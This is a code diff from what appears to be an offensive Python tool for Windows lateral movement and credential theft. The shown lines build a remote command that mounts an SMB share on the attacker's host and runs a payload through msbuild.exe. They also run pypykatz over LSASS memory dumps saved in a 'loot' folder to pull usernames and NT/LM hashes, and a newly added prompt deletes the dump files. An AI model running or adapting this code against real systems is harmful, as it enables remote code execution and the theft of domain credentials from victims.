@@ -904,7 +904,7 @@ if __name__ == '__main__':
         print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user, share_pass))
 
         print("[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
-        command = r"net use {}: \\{}\{} /user:{} {} & C:\\Windows\\Microsoft.NET\\framework64\\v4.0.30319\\msbuild.exe {}:\{}.xml & net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
+        command = r"net use {}: \\{}\{} /user:{} {} && C:\\Windows\\Microsoft.NET\\framework64\\v4.0.30319\\msbuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         print(command)
         print("")
 
@@ -945,6 +945,10 @@ if __name__ == '__main__':
             os.system("python3 -m pypykatz lsa minidump -d ./loot/{}/ -o ./loot/{}/dumped_full.txt".format(timestamp, timestamp))
             os.system("python3 -m pypykatz lsa -g minidump -d ./loot/{}/ -o ./loot/{}/dumped_full_grep.grep".format(timestamp, timestamp))
             os.system("echo 'Domain:Username:NT:LM' > ./loot/{}/dumped_msv.txt; grep 'msv' ./loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host' >> ./loot/{}/dumped_msv.txt".format(timestamp, timestamp, timestamp))
+
+            remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
+            if remove_files.lower() == 'y':
+                os.system('sudo rm ./loot/{}/*.dmp'.format(timestamp))
 
 
     except KeyboardInterrupt as e:
